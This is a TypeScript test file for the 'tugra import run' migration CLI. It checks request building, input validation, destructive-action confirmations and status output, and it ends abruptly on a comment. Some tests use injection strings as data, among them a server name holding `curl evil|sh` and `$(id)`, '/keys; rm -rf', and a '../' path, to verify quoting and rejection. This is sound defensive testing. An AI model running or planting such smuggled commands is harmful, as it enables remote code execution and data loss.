import { Command } from "commander";
import { CAMPAIGN_REPORT_MAX_RUNS, RUN_ACTIONS, aggregateCampaign, buildCampaignListRequest, buildCreateRequest, buildListRequest, buildRequest, confirmHint, fetchCampaignReport, formatCampaignMarkdown, formatCampaignReport, formatEvent, formatSafetyHints, formatStatus, isTerminal, parseServerMap, register, shellQuote, watchRun, type RunView } from "./run";

const PLAN = "a".repeat(32);
const HASH = "b".repeat(64);
const create = { session: "s1", server: "srv1", planHash: PLAN };

const view = (over: Partial<RunView> = {}): RunView => ({
  id: "run1",
  status: "WAITING",
  currentStep: "FREEZE",
  mode: "copy",
  topology: "two-box",
  dryRun: false,
  ponrAt: null,
  targetServerName: "tugra-box",
  sourceHost: "coolify.example.com",
  failure: null,
  nextAction: { kind: "gate", stepKey: "FREEZE", code: "gate.blocked", since: "2026-11-22T01:00:00Z" },
  windowEstimate: null,
  measuredDowntimeSec: null,
  steps: [{ key: "PREFLIGHT", status: "PASSED", kind: "auto", attempt: 1, rollbackClass: "FREE", lastError: null, progress: null }],
  eventSeq: 4,
  ...over,
});

describe("tugra import run: create", () => {
  it("sends only what was asked for, so the hub applies its safe defaults", () => {
    expect(buildCreateRequest(create)).toEqual({ method: "POST", path: "/migration-runs", body: { sessionId: "s1", sourceKind: "coolify", targetServerId: "srv1", planHash: PLAN } });
  });

  it("maps every option and owner input onto the request schema's names", () => {
    const req = buildCreateRequest({
      ...create, sourceKind: "dokploy", environment: "env1", mode: "takeover", topology: "swap-proxy", dryRun: true,
      mapping: { version: 1 }, mappingHash: "c".repeat(32), acks: [{ code: "app.env.unresolved" }], dbDataModes: { "database:a:b": "volume" }, reconcile: true, saveMapping: false,
      ttlPolicy: "skip-ack", deployWaves: "earlyStateless", warmDbSeed: true, stopSource: true, sourceRunner: "agent", certs: "seed", acceptHttp01Gap: true,
      freezeAt: "2026-11-22T02:00:00Z", observeMinutes: 0, manualFinalize: true, batchSize: 3, interval: 60, dnsCredential: "dns1", healthPath: "/health",
      rowCountMode: "exact", decommissionMinAge: 96, stuckOperatorMinutes: 30, acmeEmail: "ops@example.com", allowBind: false, allowLiveProbe: true, sourceController: "api",
    });
    expect(req.body).toEqual({
      sessionId: "s1", sourceKind: "dokploy", targetServerId: "srv1", planHash: PLAN, environmentId: "env1", mode: "takeover", topology: "swap-proxy", dryRun: true,
      mapping: { version: 1 }, mappingHash: "c".repeat(32), acks: [{ code: "app.env.unresolved" }], dbDataModes: { "database:a:b": "volume" }, reconcile: true, saveMapping: false,
      options: {
        ttlPolicy: "skip-ack", deployWaves: "earlyStateless", warmDbSeed: true, stopSource: true, sourceRunner: "agent", certs: "seed", acceptHttp01Gap: true,
        freezeAt: "2026-11-22T02:00:00Z", observeMinutes: 0, manualFinalize: true, batchSize: 3, intervalSec: 60, dnsCredentialId: "dns1", healthPath: "/health",
        rowCountMode: "exact", decommissionMinAgeHours: 96, stuckOperatorMinutes: 30,
      },
      inputs: { acmeEmail: "ops@example.com", allowBind: false, allowLiveShapeProbe: true, sourceController: "api" },
    });
  });

  it("refuses bad input before any request is made", () => {
    expect(() => buildCreateRequest({ ...create, session: undefined })).toThrow(/--session/);
    expect(() => buildCreateRequest({ ...create, server: undefined })).toThrow(/--server/);
    expect(() => buildCreateRequest({ ...create, planHash: "xyz" })).toThrow(/--plan-hash/);
    expect(() => buildCreateRequest({ ...create, sourceKind: "nope" })).toThrow(/--source-kind/);
    expect(() => buildCreateRequest({ ...create, topology: "side-by-side" })).toThrow(/--topology/);
    expect(() => buildCreateRequest({ ...create, mode: "move" })).toThrow(/--mode/);
    expect(() => buildCreateRequest({ ...create, mapping: {} })).toThrow(/together/);
    expect(() => buildCreateRequest({ ...create, mappingHash: "c".repeat(32) })).toThrow(/together/);
    expect(() => buildCreateRequest({ ...create, batchSize: 99 })).toThrow(/--batch-size/);
    expect(() => buildCreateRequest({ ...create, observeMinutes: Number.NaN })).toThrow(/--observe-minutes/);
    expect(() => buildCreateRequest({ ...create, freezeAt: "tomorrow-ish" })).toThrow(/--freeze-at/);
    expect(() => buildCreateRequest({ ...create, healthPath: "health" })).toThrow(/--health-path/);
    expect(() => buildCreateRequest({ ...create, sourceController: "ssh" })).toThrow(/--source-controller/);
  });
});

describe("tugra import run: list, status, events", () => {
  it("builds the list query", () => {
    expect(buildListRequest({})).toEqual({ method: "GET", path: "/migration-runs" });
    expect(buildListRequest({ team: "t1", status: "WAITING", active: true, limit: 10 }).path).toBe("/migration-runs?teamId=t1&status=WAITING&active=true&limit=10");
    expect(() => buildListRequest({ limit: 500 })).toThrow(/--limit/);
  });

  it("status and events", () => {
    expect(buildRequest("status", "r 1", {})).toEqual({ method: "GET", path: "/migration-runs/r%201" });
    expect(buildRequest("events", "r1", {}).path).toBe("/migration-runs/r1/events");
    expect(buildRequest("events", "r1", { afterSeq: 12, limit: 50 }).path).toBe("/migration-runs/r1/events?afterSeq=12&limit=50");
    expect(() => buildRequest("events", "r1", { limit: 0 })).toThrow(/--limit/);
    expect(() => buildRequest("status", "", {})).toThrow(/run id/);
  });
});

describe("tugra import run: step actions", () => {
  it("approve carries the reviewed hash and what the human typed, and needs the hash", () => {
    expect(() => buildRequest("approve", "r1", { step: "FREEZE" })).toThrow(/--hash/);
    expect(() => buildRequest("approve", "r1", { step: "FREEZE", hash: "short" })).toThrow(/--hash/);
    expect(buildRequest("approve", "r1", { step: "FREEZE", hash: HASH })).toEqual({ method: "POST", path: "/migration-runs/r1/steps/FREEZE/approve", body: { boundHash: HASH, acks: [] } });
    expect(buildRequest("approve", "r1", { step: "VERIFY", hash: HASH, ack: "a, b", confirm: "tugra-box coolify.example.com", acceptDataRisk: true }).body).toEqual({
      boundHash: HASH, acks: ["a", "b"], confirmName: "tugra-box coolify.example.com", acceptDataRisk: true,
    });
  });

  it("every step action needs a step key and never builds a path from a malformed one", () => {
    for (const a of ["approve", "retry", "skip", "evidence", "attach", "command"] as const) {
      expect(() => buildRequest(a, "r1", { hash: HASH, check: "c", objectMigration: "o1" })).toThrow(/step key/);
      expect(() => buildRequest(a, "r1", { step: "../x", hash: HASH, check: "c", objectMigration: "o1" })).toThrow(/step key/);
    }
  });

  it("retry, skip, evidence, attach, command", () => {
    expect(buildRequest("retry", "r1", { step: "IMPORT" })).toEqual({ method: "POST", path: "/migration-runs/r1/steps/IMPORT/retry", body: {} });
    expect(buildRequest("skip", "r1", { step: "DATA_SEED", reason: "no data" }).body).toEqual({ reason: "no data" });
    expect(buildRequest("skip", "r1", { step: "DATA_SEED" }).body).toEqual({});
    expect(() => buildRequest("evidence", "r1", { step: "FREEZE" })).toThrow(/--check/);
    expect(buildRequest("evidence", "r1", { step: "FREEZE", check: "source.quiesced", subject: "srv", note: "stopped by hand" }).body).toEqual({ checkId: "source.quiesced", subject: "srv", note: "stopped by hand" });
    expect(() => buildRequest("attach", "r1", { step: "DATA_SEED" })).toThrow(/--object-migration/);
    expect(buildRequest("attach", "r1", { step: "DATA_SEED", objectMigration: "om1" }).body).toEqual({ kind: "object-migration", resourceId: "om1" });
    expect(buildRequest("command", "r1", { step: "DATA_FINAL" }).body).toEqual({ reissue: false });
    expect(buildRequest("command", "r1", { step: "DATA_FINAL", reissue: true }).body).toEqual({ reissue: true });
  });

  it("start promotes with an optional fresh session; pause and resume carry nothing", () => {
    expect(buildRequest("start", "r1", {})).toEqual({ method: "POST", path: "/migration-runs/r1/start", body: {} });
    expect(buildRequest("start", "r1", { session: "s2" }).body).toEqual({ sessionId: "s2" });
    expect(buildRequest("pause", "r1", {}).path).toBe("/migration-runs/r1/pause");
    expect(buildRequest("resume", "r1", {}).path).toBe("/migration-runs/r1/resume");
  });

  it("inputs needs at least one input and can send a false", () => {
    expect(() => buildRequest("inputs", "r1", {})).toThrow(/at least one/);
    expect(buildRequest("inputs", "r1", { allowBind: false, acmeEmail: "ops@example.com" })).toEqual({ method: "POST", path: "/migration-runs/r1/inputs", body: { acmeEmail: "ops@example.com", allowBind: false } });
    expect(() => buildRequest("inputs", "r1", { sourceController: "ssh" })).toThrow(/--source-controller/);
  });
});

describe("tugra import run: destructive actions", () => {
  it("abort, cleanup and reverse need the run id typed back", () => {
    for (const a of ["abort", "cleanup", "reverse"] as const) {
      expect(() => buildRequest(a, "r1", { acknowledgeDataLoss: true })).toThrow(/--confirm/);
      expect(() => buildRequest(a, "r1", { confirm: "r2", acknowledgeDataLoss: true })).toThrow(/--confirm/);
    }
    expect(buildRequest("abort", "r1", { confirm: "r1" })).toEqual({ method: "POST", path: "/migration-runs/r1/abort", body: { confirmName: "r1" } });
  });

  it("cleanup keeps data-bearing resources behind --include-data and their names", () => {
    expect(buildRequest("cleanup", "r1", { confirm: "r1" }).body).toEqual({ confirmName: "r1", includeData: false, dataConfirmNames: [] });
    expect(buildRequest("cleanup", "r1", { confirm: "r1", includeData: true, dataConfirm: "db1, vol1" }).body).toEqual({ confirmName: "r1", includeData: true, dataConfirmNames: ["db1", "vol1"] });
    expect(() => buildRequest("cleanup", "r1", { confirm: "r1", dataConfirm: "db1" })).toThrow(/--include-data/);
  });

  it("reverse needs the data-loss acknowledgement", () => {
    expect(() => buildRequest("reverse", "r1", { confirm: "r1" })).toThrow(/--acknowledge-data-loss/);
    expect(buildRequest("reverse", "r1", { confirm: "r1", acknowledgeDataLoss: true })).toEqual({ method: "POST", path: "/migration-runs/r1/reverse", body: { confirmName: "r1", acknowledgeDataLoss: true } });
  });

  it("decommission types the source host", () => {
    expect(() => buildRequest("decommission", "r1", {})).toThrow(/source host/);
    expect(buildRequest("decommission", "r1", { confirm: "coolify.example.com" }).body).toEqual({ confirmName: "coolify.example.com" });
  });

  it("source-session reads the token from the environment, never a flag, and the request carries it only in the body", () => {
    expect(() => buildRequest("source-session", "r1", {})).toThrow(/TUGRA_SOURCE_TOKEN/);
    const req = buildRequest("source-session", "r1", { token: "tok" });
    expect(req).toEqual({ method: "POST", path: "/migration-runs/r1/source-session", body: { token: "tok" } });
    expect(req.path).not.toContain("tok");
  });

  it("report: json by default, markdown on request", () => {
    expect(buildRequest("report", "r1", {}).path).toBe("/migration-runs/r1/report");
    expect(buildRequest("report", "r1", { format: "md" }).path).toBe("/migration-runs/r1/report?format=md");
    expect(() => buildRequest("report", "r1", { format: "pdf" })).toThrow(/--format/);
  });

  it("every action in the list builds a request (so none is registered without a builder)", () => {
    const o = { step: "FREEZE", hash: HASH, check: "c", objectMigration: "o1", confirm: "r1", acknowledgeDataLoss: true, token: "t", acmeEmail: "a@b.co", image: "repo/app:latest", digest: `sha256:${"a".repeat(64)}`, item: "app:host-a:web", role: "job-runner" };
    for (const a of RUN_ACTIONS) expect(() => buildRequest(a, "r1", o)).not.toThrow();
  });
});

describe("rendering", () => {
  it("confirmHint names what the human must type", () => {
    const ctx = { runId: "r1", serverName: "tugra-box", sourceHost: "coolify.example.com" };
    expect(confirmHint("none", ctx)).toBeNull();
    expect(confirmHint("run-id", ctx)).toBe("r1");
    expect(confirmHint("target-server", ctx)).toBe("tugra-box");
    expect(confirmHint("source-host", ctx)).toBe("coolify.example.com");
    expect(confirmHint("target-server+source-host", ctx)).toBe("tugra-box coolify.example.com");
    expect(confirmHint("target-server", { ...ctx, serverName: null })).toBe("<target server name>");
  });

  it("formatEvent is one stable line with params", () => {
    expect(formatEvent({ seq: 7, at: "2026-11-22T02:00:00Z", stepKey: "FREEZE", level: "info", code: "step.started", params: { hosts: 3 } })).toBe(
      '   7 2026-11-22T02:00:00Z info  FREEZE        step.started {"hosts":3}',
    );
    expect(formatEvent({ seq: 8, at: "t", stepKey: null, level: "warn", code: "run.paused", params: null })).toContain("-             run.paused");
  });

  it("status prints the approval with the exact command, and says an agent cannot cross the point of no return", () => {
    const lines = formatStatus(
      view({
        currentStep: "VERIFY",
        nextAction: {
          kind: "approval", stepKey: "VERIFY", code: "approval.required", since: "t",
          approval: { inputHash: HASH, ponr: true, confirm: "target-server+source-host", ttlSec: 1800, requiresDataRisk: true, ackable: ["x"], requiredAcks: ["x"] },
        },
      }),
    ).join("\n");
    expect(lines).toContain(`tugra import run approve run1 VERIFY --hash ${HASH} --ack x --confirm 'tugra-box coolify.example.com' --accept-data-risk`);
    expect(lines).toContain("POINT OF NO RETURN");
    expect(lines).toContain("refused over MCP");
    expect(lines).not.toContain("an agent cannot");
    expect(lines).toContain("valid for 30 min");
    expect(lines).toContain("point of no return: not reached");
  });

  it("status offers the source-host command and attestations on an operator wait, and shows the failure", () => {
    const lines = formatStatus(
      view({ failure: { step: "IMPORT", code: "import.failed" }, nextAction: { kind: "operator", stepKey: "DATA_FINAL", code: "data.run-migrator", since: "t", offersCommand: true, attest: ["source.quiesced"] } }),
    ).join("\n");
    expect(lines).toContain("tugra import run command run1 DATA_FINAL");
    expect(lines).toContain("source.quiesced");
    expect(lines).toContain("failed: import.failed at IMPORT");
    expect(lines).toContain("PREFLIGHT");
  });

  it("a hostile server name stays one literal argument in the printed approve command", () => {
    const evil = `x"; curl evil|sh; $(id) \`id\` it's`;
    const lines = formatStatus(
      view({
        targetServerName: evil,
        nextAction: {
          kind: "approval", stepKey: "FREEZE", code: "approval.required", since: "t",
          approval: { inputHash: HASH, ponr: false, confirm: "target-server", ttlSec: 0, requiresDataRisk: false, ackable: [], requiredAcks: [] },
        },
      }),
    ).join("\n");
    expect(lines).toContain(`--confirm ${shellQuote(evil)}`);
    expect(lines).not.toContain(`--confirm "`);
    expect(shellQuote("it's")).toBe(`'it'\\''s'`);
    expect(shellQuote("plain name")).toBe("'plain name'");
  });

  it("isTerminal", () => {
    for (const s of ["COMPLETED", "ABORTED", "ROLLED_BACK", "REVERSED", "DRY_RUN_DONE"]) expect(isTerminal(s)).toBe(true);
    for (const s of ["RUNNING", "WAITING", "PAUSED", "FAILED", "ABORTING"]) expect(isTerminal(s)).toBe(false);
  });
});

describe("watchRun", () => {
  const harness = (script: Array<{ events: Array<{ seq: number; code: string }>; view: Partial<RunView> }>) => {
    const written: string[] = [];
    const slept: number[] = [];
    const paths: string[] = [];
    let i = 0;
    let lastSeq = 0;
    return {
      written, slept, paths,
      deps: {
        write: (l: string) => void written.push(l),
        sleep: async (ms: number) => void slept.push(ms),
        get: async (p: string) => {
          paths.push(p);
          const step = script[Math.min(i, script.length - 1)];
          if (p.includes("/events")) {
            const afterSeq = Number(/afterSeq=(\d+)/.exec(p)?.[1] ?? 0);
            const events = step.events.filter((e) => e.seq > afterSeq).map((e) => ({ ...e, at: "t", stepKey: null, level: "info", params: null }));
            if (events.length) lastSeq = events[events.length - 1].seq;
            return { events, lastSeq, hasMore: false };
          }
          i++;
          return view(step.view);
        },
      },
    };
  };

  it("prints each event once, follows the cursor and stops at a terminal status", async () => {
    const h = harness([
      { events: [{ seq: 1, code: "a" }, { seq: 2, code: "b" }], view: { status: "RUNNING", nextAction: { kind: "engine", stepKey: null, code: "x", since: "t" } } },
      { events: [{ seq: 3, code: "c" }], view: { status: "COMPLETED", nextAction: { kind: "none", stepKey: null, code: "x", since: "t" } } },
    ]);
    const v = await watchRun("r1", { interval: 2 }, h.deps);
    expect(v.status).toBe("COMPLETED");
    expect(h.written).toHaveLength(3);
    expect(h.paths.filter((p) => p.includes("/events")).map((p) => p.split("?")[1])).toEqual(["afterSeq=0&limit=500", "afterSeq=2&limit=500", "afterSeq=3&limit=500"]);
    expect(h.slept).toEqual([2000]);
  });

  it("with --until-waiting it returns when a human is needed, but keeps going through timers and engine work", async () => {
    const h = harness([
      { events: [], view: { status: "WAITING", nextAction: { kind: "timer", stepKey: "DNS_PREPARE", code: "t", since: "t" } } },
      { events: [], view: { status: "WAITING", nextAction: { kind: "engine", stepKey: null, code: "e", since: "t" } } },
      { events: [], view: { status: "WAITING", nextAction: { kind: "approval", stepKey: "FREEZE", code: "a", since: "t" } } },
    ]);
    const v = await watchRun("r1", { interval: 1, untilWaiting: true }, h.deps);
    expect(v.nextAction.kind).toBe("approval");
    expect(h.slept).toHaveLength(2);
  });

  it("an event appended between the events fetch and the view fetch is still printed at a terminal status", async () => {
    const written: string[] = [];
    let eventCalls = 0;
    const deps = {
      write: (l: string) => void written.push(l),
      sleep: async () => undefined,
      get: async (p: string) => {
        if (p.includes("/events")) {
          eventCalls++;
          const events = eventCalls === 1 ? [{ seq: 1, code: "step.done" }] : [{ seq: 2, code: "run.completed" }];
          return { events: events.map((e) => ({ ...e, at: "t", stepKey: null, level: "info", params: null })), lastSeq: events[0].seq, hasMore: false };
        }
        return view({ status: "COMPLETED", nextAction: { kind: "none", stepKey: null, code: "x", since: "t" } });
      },
    };
    await watchRun("r1", { interval: 1 }, deps);
    expect(written.map((l) => l.includes("run.completed"))).toEqual([false, true]);
  });

  it("maxPolls bounds the loop", async () => {
    const h = harness([{ events: [], view: { status: "RUNNING", nextAction: { kind: "engine", stepKey: null, code: "e", since: "t" } } }]);
    await watchRun("r1", { interval: 1, maxPolls: 3 }, h.deps);
    expect(h.slept).toHaveLength(2);
  });
});

describe("command registration", () => {
  it("registers `import run` with every sub-command, and the destructive ones require --confirm", () => {
    const program = new Command();
    register(program);
    const imps = program.commands.filter((c) => c.name() === "import");
    expect(imps).toHaveLength(1);
    const runs = imps[0].commands.filter((c) => c.name() === "run");
    expect(runs).toHaveLength(1);
    const names = runs[0].commands.map((c) => c.name());
    expect(names).toEqual(expect.arrayContaining(["list", "create", "status", "events", "watch", "start", "approve", "retry", "skip", "evidence", "attach", "command", "inputs", "pause", "resume", "abort", "cleanup", "reverse", "decommission", "source-session", "report", "safety-hints", "image-pin", "worker-mark"]));
    for (const n of ["abort", "cleanup", "reverse", "decommission"]) {
      const c = runs[0].commands.find((x) => x.name() === n)!;
      expect(c.options.find((o) => o.long === "--confirm")?.required).toBe(true);
    }
    expect(runs[0].commands.find((c) => c.name() === "approve")!.options.find((o) => o.long === "--hash")?.required).toBe(true);
  });
});

describe("tugra import run: fleet runs", () => {
  it("parses --map pairs into a placement map and refuses a duplicate, a missing side and a prototype name", () => {
    expect(parseServerMap(["host-a=srv1", "host-b=srv2"])).toEqual({ "host-a": "srv1", "host-b": "srv2" });
    expect(() => parseServerMap(["host-a=srv1", "host-a=srv2"])).toThrow(/mapped twice/);
    expect(() => parseServerMap(["host-a"])).toThrow(/--map expects/);
    expect(() => parseServerMap(["host-a="])).toThrow(/--map expects/);
    expect(() => parseServerMap(["=srv1"])).toThrow(/--map expects/);
    expect(() => parseServerMap(["__proto__=srv1"])).toThrow(/not a valid source server ref/);
    expect(() => parseServerMap(["has space=srv1"])).toThrow(/not a valid source server ref/);
  });

  it("sends the placement as the run-level serverMap and the campaign label, trimmed", () => {
    const req = buildCreateRequest({ ...create, serverMap: { "host-a": "srv1", "host-b": "srv2" }, campaign: " wave-1 " });
    expect(req.body).toMatchObject({ targetServerId: "srv1", serverMap: { "host-a": "srv1", "host-b": "srv2" }, campaign: "wave-1" });
    expect(buildCreateRequest(create).body).not.toHaveProperty("serverMap");
    expect(() => buildCreateRequest({ ...create, serverMap: {} })).toThrow(/server map is empty/);
    expect(() => buildCreateRequest({ ...create, serverMap: Object.fromEntries(Array.from({ length: 65 }, (_, i) => [`h${i}`, "srv1"])) })).toThrow(/at most 64/);
    expect(() => buildCreateRequest({ ...create, campaign: "" })).toThrow(/--campaign/);
    expect(() => buildCreateRequest({ ...create, campaign: "x".repeat(81) })).toThrow(/--campaign/);
  });

  it("sends the host-loop runner with its tuning, and refuses the tuning for another runner or an unsafe key directory", () => {
    const req = buildCreateRequest({ ...create, sourceRunner: "coolify-host-loop", hostLoopKeyDir: "/data/coolify/ssh/keys", hostLoopParallel: 2, hostLoopConnectTimeout: 30, hostLoopRetries: 0 });
    expect(req.body).toMatchObject({ options: { sourceRunner: "coolify-host-loop", hostLoop: { keyDir: "/data/coolify/ssh/keys", parallel: 2, connectTimeoutSec: 30, retries: 0 } } });
    // tuning without a key directory falls back to the documented default
    expect(buildCreateRequest({ ...create, sourceRunner: "coolify-host-loop", hostLoopParallel: 3 }).body).toMatchObject({ options: { hostLoop: { keyDir: "/data/coolify/ssh/keys", parallel: 3 } } });
    expect(() => buildCreateRequest({ ...create, hostLoopParallel: 2 })).toThrow(/need --source-runner coolify-host-loop/);
    expect(() => buildCreateRequest({ ...create, sourceRunner: "agent", hostLoopKeyDir: "/keys" })).toThrow(/need --source-runner coolify-host-loop/);
    expect(() => buildCreateRequest({ ...create, sourceRunner: "coolify-host-loop", hostLoopKeyDir: "/data/../etc" })).toThrow(/--host-loop-key-dir/);
    expect(() => buildCreateRequest({ ...create, sourceRunner: "coolify-host-loop", hostLoopKeyDir: "/keys; rm -rf" })).toThrow(/--host-loop-key-dir/);
    expect(() => buildCreateRequest({ ...create, sourceRunner: "coolify-host-loop", hostLoopParallel: 9 })).toThrow(/--host-loop-parallel/);
    expect(() => buildCreateRequest({ ...create, sourceRunner: "coolify-host-loop", hostLoopConnectTimeout: 4 })).toThrow(/--host-loop-connect-timeout/);
    expect(() => buildCreateRequest({ ...create, sourceRunner: "coolify-host-loop", hostLoopRetries: 6 })).toThrow(/--host-loop-retries/);
  });

  it("sends the build, large-database options and the fleet policy answers, and refuses an unknown choice", () => {
    const req = buildCreateRequest({
      ...create, deployWaves: "earlyBuild", deployConcurrency: 2, largeDbMode: "stream-logical",
      minioPolicy: "mirror", workerPolicy: "exclude", unlistedDbPolicy: "carry", orphanVolumePolicy: "skip",
    });
    expect(req.body).toMatchObject({
      options: { deployWaves: "earlyBuild", deployConcurrency: 2, largeDbMode: "stream-logical" },
      inputs: { minioPolicy: "mirror", workerPolicy: "exclude", unlistedDbPolicy: "carry", orphanVolumePolicy: "skip" },
    });
    expect(() => buildCreateRequest({ ...create, largeDbMode: "stream" })).toThrow(/--large-db-mode/);
    // C14/R30: which imported services start before the apps that need them (sent only when asked for)
    expect(buildCreateRequest({ ...create, serviceStart: "none" }).body).toMatchObject({ options: { serviceStart: "none" } });
    expect((buildCreateRequest({ ...create }).body as { options?: Record<string, unknown> }).options ?? {}).not.toHaveProperty("serviceStart");
    expect(() => buildCreateRequest({ ...create, serviceStart: "some" })).toThrow(/--service-start/);
    expect(() => buildCreateRequest({ ...create, minioPolicy: "ignore" })).toThrow(/--minio-policy/);
    expect(() => buildCreateRequest({ ...create, workerPolicy: "x" })).toThrow(/--worker-policy/);
    expect(() => buildCreateRequest({ ...create, unlistedDbPolicy: "x" })).toThrow(/--unlisted-db-policy/);
    expect(() => buildCreateRequest({ ...create, orphanVolumePolicy: "x" })).toThrow(/--orphan-volume-policy/);
    expect(() => buildCreateRequest({ ...create, deployConcurrency: 9 })).toThrow(/--deploy-concurrency/);
    // nothing answered, nothing sent: the hub's fail-closed defaults apply
    expect(buildCreateRequest(create).body).not.toHaveProperty("inputs");
  });

  it("the earlyBuild wave is accepted and an unknown wave is not", () => {
    expect(buildCreateRequest({ ...create, deployWaves: "earlyBuild" }).body).toMatchObject({ options: { deployWaves: "earlyBuild" } });
    expect(() => buildCreateRequest({ ...create, deployWaves: "late" })).toThrow(/--deploy-waves/);
  });

  it("inputs accepts the fleet policies and names them when none is given", () => {
    expect(buildRequest("inputs", "r1", { minioPolicy: "hold", orphanVolumePolicy: "block" })).toEqual({
      method: "POST", path: "/migration-runs/r1/inputs", body: { minioPolicy: "hold", orphanVolumePolicy: "block" },
    });
    expect(() => buildRequest("inputs", "r1", {})).toThrow(/--minio-policy/);
    expect(() => buildRequest("inputs", "r1", { workerPolicy: "nope" })).toThrow(/--worker-policy/);
  });

  it("list filters by campaign", () => {
    expect(buildListRequest({ campaign: "wave 1" }).path).toBe("/migration-runs?campaign=wave%201");
    expect(() => buildListRequest({ campaign: "" })).toThrow(/--campaign/);
  });

  it("command can name its kind, and refuses an unknown one", () => {
    expect(buildRequest("command", "r1", { step: "DATA_SEED", kind: "inventory" }).body).toEqual({ reissue: false, kind: "inventory" });
    expect(buildRequest("command", "r1", { step: "FREEZE", kind: "host-loop", reissue: true }).body).toEqual({ reissue: true, kind: "host-loop" });
    expect(buildRequest("command", "r1", { step: "DATA_SEED" }).body).toEqual({ reissue: false });
    expect(() => buildRequest("command", "r1", { step: "DATA_SEED", kind: "ssh" })).toThrow(/--kind/);
  });

  it("image pins carry the digest the source runs (or remove it), and refuse a malformed one", () => {
    const digest = `sha256:${"a".repeat(64)}`;
    expect(buildRequest("image-pin", "r1", { image: "repo/app:latest", digest })).toEqual({
      method: "PUT", path: "/migration-runs/r1/image-pins", body: { pins: [{ image: "repo/app:latest", scope: "", digest }] },
    });
    expect(buildRequest("image-pin", "r1", { image: "repo/app:latest", digest, scope: "host-a", evidenceKind: "host-loop-reported" }).body).toEqual({
      pins: [{ image: "repo/app:latest", scope: "host-a", digest, evidence: "host-loop-reported" }],
    });
    expect(buildRequest("image-pin", "r1", { image: "repo/app:latest", remove: true }).body).toEqual({ pins: [{ image: "repo/app:latest", scope: "", digest: null }] });
    expect(() => buildRequest("image-pin", "r1", { digest })).toThrow(/--image/);
    expect(() => buildRequest("image-pin", "r1", { image: "bad image", digest })).toThrow(/--image/);
    expect(() => buildRequest("image-pin", "r1", { image: "repo/app:latest", digest: "sha256:short" })).toThrow(/--digest/);
    expect(() => buildRequest("image-pin", "r1", { image: "repo/app:latest" })).toThrow(/--digest/);
    expect(() => buildRequest("image-pin", "r1", { image: "repo/app:latest", digest, remove: true })).toThrow(/--remove takes no --digest/);
    expect(() => buildRequest("image-pin", "r1", { image: "repo/app:latest", digest, evidenceKind: "guess" })).toThrow(/--evidence/);
  });

  it("worker marks set a role or clear it with none", () => {
    expect(buildRequest("worker-mark", "r1", { item: "app:host-a:queue", role: "job-runner" })).toEqual({
      method: "PUT", path: "/migration-runs/r1/worker-marks", body: { marks: [{ itemRef: "app:host-a:queue", role: "job-runner" }] },
    });
    expect(buildRequest("worker-mark", "r1", { item: "app:host-a:queue", role: "none" }).body).toEqual({ marks: [{ itemRef: "app:host-a:queue", role: null }] });
    expect(() => buildRequest("worker-mark", "r1", { role: "web" })).toThrow(/--item/);
    expect(() => buildRequest("worker-mark", "r1", { item: "database:h:db", role: "web" })).toThrow(/--item/);
    expect(() => buildRequest("worker-mark", "r1", { item: "app:host-a:queue", role: "boss" })).toThrow(/--role/);
    expect(buildRequest("safety-hints", "r1", {})).toEqual({ method: "GET", path: "/migration-runs/r1/safety-hints" });
  });

  it("confirmHint names EVERY target server of a multi-host run, sorted, joined with a comma, then the source host", () => {
    const ctx = { runId: "r1", serverName: "tugra-1", sourceHost: "coolify.example.com", serverNames: ["tugra-b", "tugra-1", "tugra-b"] };
    expect(confirmHint("target-servers", ctx)).toBe("tugra-1, tugra-b");
    expect(confirmHint("target-servers+source-host", ctx)).toBe("tugra-1, tugra-b coolify.example.com");
    // a server whose name is unknown blocks a guess rather than naming only some of the hosts
    expect(confirmHint("target-servers", { ...ctx, serverNames: ["tugra-1", null] })).toBe("<target server names>");
    expect(confirmHint("target-servers", { runId: "r1", serverName: "tugra-1", sourceHost: null })).toBe("tugra-1");
  });

  it("status prints the placement, every server, the version verdict, the campaign and the multi-host approval command", () => {
    const lines = formatStatus(
      view({
        targetServers: [{ serverId: "s1", serverName: "tugra-box", primary: true }, { serverId: "s2", serverName: "tugra-b", primary: false }],
        serverMap: { "host-b": "s2", "host-a": "s1" },
        sourceVersion: "4.9.0", sourceVersionVerdict: "newer", campaign: "wave-1", baselineAt: null,
        currentStep: "VERIFY",
        nextAction: { kind: "approval", stepKey: "VERIFY", code: "approval.required", since: "t", approval: { inputHash: HASH, ponr: true, confirm: "target-servers+source-host", ttlSec: 1800, requiresDataRisk: true, ackable: [], requiredAcks: [] } },
      }),
    ).join("\n");
    expect(lines).toContain("target tugra-box (default), tugra-b");
    expect(lines).toContain("placement: host-a -> tugra-box, host-b -> tugra-b");
    expect(lines).toContain("source version: 4.9.0 (newer)   campaign: wave-1   health baseline: not recorded yet");
    // sorted by code point: "tugra-b" is a prefix of "tugra-box", so it sorts first
    expect(lines).toContain("--confirm 'tugra-b, tugra-box coolify.example.com'");
    // a stored single-target view prints exactly as before
    expect(formatStatus(view()).join("\n")).not.toContain("placement:");
  });

  it("prints the recorded safety facts", () => {
    expect(formatSafetyHints({ imagePins: [], workerMarks: [] }).join("\n")).toContain("(none)");
    const out = formatSafetyHints({ imagePins: [{ image: "repo/app:latest", scope: "host-a", digest: "sha256:abc", evidence: "operator-attested" }], workerMarks: [{ itemRef: "app:host-a:queue", role: "job-runner" }] }).join("\n");
    expect(out).toContain("repo/app:latest @ host-a  sha256:abc  (operator-attested)");
    expect(out).toContain("app:host-a:queue  job-runner");
  });

  it("registers the fleet options on create and the new sub-commands", () => {
    const program = new Command();
    register(program);
    const run = program.commands.find((c) => c.name() === "import")!.commands.find((c) => c.name() === "run")!;
    const createCmd = run.commands.find((c) => c.name() === "create")!;
    for (const flag of ["--map", "--server-map-file", "--campaign", "--host-loop-key-dir", "--host-loop-parallel", "--deploy-concurrency", "--large-db-mode", "--service-start", "--minio-policy", "--worker-policy", "--unlisted-db-policy", "--orphan-volume-policy"]) {
      expect(createCmd.options.map((o) => o.long)).toContain(flag);
    }
    expect(run.commands.find((c) => c.name() === "list")!.options.map((o) => o.long)).toContain("--campaign");
    expect(run.commands.find((c) => c.name() === "command")!.options.map((o) => o.long)).toContain("--kind");
    expect(run.commands.find((c) => c.name() === "image-pin")!.options.find((o) => o.long === "--image")?.required).toBe(true);
    expect(run.commands.find((c) => c.name() === "worker-mark")!.options.find((o) => o.long === "--role")?.required).toBe(true);
    // an input no step reads is not offered
    expect(createCmd.options.map((o) => o.long)).not.toContain("--tick-gap-accept");
    expect(run.commands.find((c) => c.name() === "inputs")!.options.map((o) => o.long)).not.toContain("--tick-gap-accept");
    // the job-runner mark holds only an app WITHOUT a domain; the help must not promise more
